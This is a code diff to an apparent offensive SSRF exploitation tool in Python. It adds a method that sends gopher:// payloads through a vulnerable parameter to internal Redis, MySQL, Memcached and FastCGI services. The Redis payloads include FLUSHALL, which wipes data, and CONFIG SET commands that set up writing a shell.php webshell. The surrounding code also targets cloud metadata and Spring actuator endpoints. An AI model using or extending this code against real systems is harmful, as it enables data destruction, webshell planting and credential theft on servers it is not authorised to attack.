@@ -1,5 +1,6 @@
-import re, json
-from typing import Optional, Dict, List
+import re
+from typing import Dict, List, Optional
+
 import requests
 
 from tools.log_utils import get_logger
@@ -109,10 +110,6 @@ def check_cloud_metadata(url: str, param: str, sess=None, timeout=10.0) -> Dict:
             logger.debug("cloud_meta %s: %s", target[:20], e)
     return result
 
-
-# ---------------------------------------------------------------------------
-# Comprehensive SSRFLateral engine (formerly ssrf_lateral)
-# ---------------------------------------------------------------------------
 
 class SSRFLateral:
     def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
@@ -236,6 +233,66 @@ class SSRFLateral:
             logger.debug("mysql ssrf: %s", e)
         return result
 
+    def exploit_gopher_protocols(self, url: str, param: str) -> Dict:
+        """Exploit Gopher protocol for Redis, MySQL, Memcached, FastCGI"""
+        result = {}
+
+        redis_payloads = {
+            "info": "gopher://127.0.0.1:6379/_INFO",
+            "flushall": "gopher://127.0.0.1:6379/_FLUSHALL",
+            "config_set_dir": "gopher://127.0.0.1:6379/_CONFIG SET dir /tmp/",
+            "config_set_dbfilename": "gopher://127.0.0.1:6379/_CONFIG SET dbfilename shell.php",
+            "slaveof_noone": "gopher://127.0.0.1:6379/_SLAVEOF no one",
+        }
+
+        for name, gopher_url in redis_payloads.items():
+            try:
+                r = self.sess.get(_build_url(url, param, gopher_url), timeout=self.timeout)
+                if len(r.text) > 10:
+                    result[f"redis_{name}"] = r.text[:300]
+            except Exception as e:
+                logger.debug("redis gopher %s: %s", name, e)
+
+        mysql_payloads = {
+            "auth_probe": "gopher://127.0.0.1:3306/_auth_probe",
+        }
+
+        for name, gopher_url in mysql_payloads.items():
+            try:
+                r = self.sess.get(_build_url(url, param, gopher_url), timeout=self.timeout)
+                if len(r.text) > 10:
+                    result[f"mysql_{name}"] = r.text[:300]
+            except Exception as e:
+                logger.debug("mysql gopher %s: %s", name, e)
+
+        memcached_payloads = {
+            "stats": "gopher://127.0.0.1:11211/_stats",
+            "version": "gopher://127.0.0.1:11211/_version",
+            "items": "gopher://127.0.0.1:11211/_stats items",
+        }
+
+        for name, gopher_url in memcached_payloads.items():
+            try:
+                r = self.sess.get(_build_url(url, param, gopher_url), timeout=self.timeout)
+                if len(r.text) > 10:
+                    result[f"memcached_{name}"] = r.text[:300]
+            except Exception as e:
+                logger.debug("memcached gopher %s: %s", name, e)
+
+        fastcgi_payloads = {
+            "phpinfo": "gopher://127.0.0.1:9000/_phpinfo",
+        }
+
+        for name, gopher_url in fastcgi_payloads.items():
+            try:
+                r = self.sess.get(_build_url(url, param, gopher_url), timeout=self.timeout)
+                if len(r.text) > 10:
+                    result[f"fastcgi_{name}"] = r.text[:300]
+            except Exception as e:
+                logger.debug("fastcgi gopher %s: %s", name, e)
+
+        return result
+
     def exploit_spring_actuator(self, url: str, param: str) -> Dict:
         result = {}
         spring_paths = [
@@ -277,6 +334,7 @@ class SSRFLateral:
             "mysql": self.exploit_mysql_ssrf(url, param),
             "spring_actuator": self.exploit_spring_actuator(url, param),
             "bypass_variants": self.bypass_filter_variants(url, param),
+            "gopher_protocols": self.exploit_gopher_protocols(url, param),
         }
         for cloud in CLOUD_META:
             for meta_url in CLOUD_META[cloud]:
@@ -290,10 +348,6 @@ class SSRFLateral:
                     logger.debug("cloud meta %s: %s", meta_url[:40], e)
         return result
 
-
-# ---------------------------------------------------------------------------
-# Unified entry points
-# ---------------------------------------------------------------------------
 
 def run(url: str, param: str, sess: Optional[requests.Session] = None,
         timeout: float = 10.0) -> Dict:
